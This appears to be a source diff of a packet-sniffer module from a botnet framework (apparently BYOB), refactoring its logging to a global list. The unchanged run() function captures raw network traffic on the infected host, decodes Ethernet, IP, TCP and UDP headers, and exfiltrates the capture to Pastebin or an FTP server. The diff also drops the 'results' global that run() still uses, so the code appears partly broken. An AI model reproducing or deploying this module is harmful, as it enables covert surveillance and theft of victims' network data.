@@ -7,6 +7,7 @@ Copyright (c) 2018 Daniel Vega-Myhre
 from __future__ import print_function
 
 # standard libarary
+
 import os
 import sys
 import time
@@ -15,12 +16,17 @@ import socket
 import binascii
 import cStringIO
 
-# byob
+# modules
+
 import util
 
+# globals
 
-_buffer = []
-results = {}
+packages  = []
+platforms = ['linux2','darwin']
+util.is_compatible(platforms, __name__)
+util.imports(packages)
+
 
 def _udp_header(data):
     try:
@@ -30,17 +36,16 @@ def _udp_header(data):
         length = udp_hdr[2]
         chksum = udp_hdr[3]
         data = data[8:]
-        _buffer.append(', ================== UDP HEADER ==================, ')
-        _buffer.append(', ================================================, ')
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Source', src))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Dest', dst))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Length', length))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chksum))
-        _buffer.append(', ================================================, ')
+        globals()['log'].append(', ================== UDP HEADER ==================, ')
+        globals()['log'].append(', ================================================, ')
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Source', src))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Dest', dst))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Length', length))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chksum))
+        globals()['log'].append(', ================================================, ')
         return data
     except Exception as e:
-        _buffer.append("Error in {} header: '{}'".format('UDP', str(e)))
-
+        globals()['log'].append("Error in {} header: '{}'".format('UDP', str(e)))
 
 def _tcp_header(recv_data):
     try:
@@ -64,21 +69,20 @@ def _tcp_header(recv_data):
         chk_sum = tcp_hdr[6]
         urg_pnt = tcp_hdr[7]
         recv_data = recv_data[20:]
-        _buffer.append(', ================== TCP HEADER ==================, ')
-        _buffer.append(', ================================================, ')
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Source', src_port))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Target', dst_port))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Seq Num', seq_num))
-        _buffer.append(', {:>20} ,  {}\t\t , '.format('Ack Num', ack_num))
-        _buffer.append(', {:>20} ,  {}\t\t , '.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Window', win))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chk_sum))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Urg Pnt', urg_pnt))
-        _buffer.append(', ================================================, ')
+        globals()['log'].append(', ================== TCP HEADER ==================, ')
+        globals()['log'].append(', ================================================, ')
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Source', src_port))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Target', dst_port))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Seq Num', seq_num))
+        globals()['log'].append(', {:>20} ,  {}\t\t , '.format('Ack Num', ack_num))
+        globals()['log'].append(', {:>20} ,  {}\t\t , '.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Window', win))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chk_sum))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Urg Pnt', urg_pnt))
+        globals()['log'].append(', ================================================, ')
         return recv_data
     except Exception as e:
-        _buffer.append("Error in {} header: '{}'".format('TCP', str(e)))
-
+        globals()['log'].append("Error in {} header: '{}'".format('TCP', str(e)))
 
 def _ip_header(data):
     try:
@@ -96,24 +100,24 @@ def _ip_header(data):
         src = socket.inet_ntoa(ip_hdr[6])
         dest = socket.inet_ntoa(ip_hdr[7])
         data = data[20:]
-        _buffer.append(', ================== IP HEADER ===================, ')
-        _buffer.append(', ================================================, ')
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('VER', ver))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('IHL', ihl))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('TOS', tos))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Length', tot_len))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('ID', ip_id))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Flags', flags))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Frag Offset', fragofs))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('TTL', ttl))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Next Protocol', ipproto))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chksum))
-        _buffer.append(', {:>20} ,  {}\t\t , '.format('Source IP', src))
-        _buffer.append(', {:>20} ,  {}\t\t , '.format('Dest IP', dest))
-        _buffer.append(', ================================================, ')
+        globals()['log'].append(', ================== IP HEADER ===================, ')
+        globals()['log'].append(', ================================================, ')
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('VER', ver))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('IHL', ihl))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('TOS', tos))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Length', tot_len))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('ID', ip_id))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Flags', flags))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Frag Offset', fragofs))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('TTL', ttl))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Next Protocol', ipproto))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chksum))
+        globals()['log'].append(', {:>20} ,  {}\t\t , '.format('Source IP', src))
+        globals()['log'].append(', {:>20} ,  {}\t\t , '.format('Dest IP', dest))
+        globals()['log'].append(', ================================================, ')
         return data, ipproto
     except Exception as e:
-        _buffer.append("Error in {} header: '{}'".format('IP', str(e)))
+        globals()['log'].append("Error in {} header: '{}'".format('IP', str(e)))
 
 
 def _eth_header(data):
@@ -123,20 +127,19 @@ def _eth_header(data):
         dst_mac = binascii.hexlify(eth_hdr[0])
         src_mac = binascii.hexlify(eth_hdr[1])
         proto = eth_hdr[2] >> 8
-        _buffer.append(', ================================================, ')
-        _buffer.append(', ================== ETH HEADER ==================, ')
-        _buffer.append(', ================================================, ')
-        _buffer.append(', {:>20} ,  {}\t , '.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
-        _buffer.append(', {:>20} ,  {}\t , '.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
-        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Protocol', proto))
-        _buffer.append(', ================================================, ')
+        globals()['log'].append(', ================================================, ')
+        globals()['log'].append(', ================== ETH HEADER ==================, ')
+        globals()['log'].append(', ================================================, ')
+        globals()['log'].append(', {:>20} ,  {}\t , '.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
+        globals()['log'].append(', {:>20} ,  {}\t , '.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
+        globals()['log'].append(', {:>20} ,  {}\t\t\t , '.format('Protocol', proto))
+        globals()['log'].append(', ================================================, ')
         if proto == 8:
             ip_bool = True
         data = data[14:]
         return data, ip_bool
     except Exception as e:
-        _buffer.append("Error in {} header: '{}'".format('ETH', str(e)))
-
+        globals()['log'].append("Error in {} header: '{}'".format('ETH', str(e)))
 
 @util.threaded
 def run(mode, seconds=30):
@@ -159,7 +162,7 @@ def run(mode, seconds=30):
         try:
             sniffer_socket.close()
         except: pass
-        output = cStringIO.StringIO('\n'.join(_buffer))
+        output = cStringIO.StringIO('\n'.join(globals()['log']))
         results[time.ctime()] = util.pastebin(output) if 'ftp' not in mode else util.ftp(output, filetype='.pcap')
     except Exception as e:
         util.debug("{} error: {}".format(packetsniffer.func_name, str(e)))
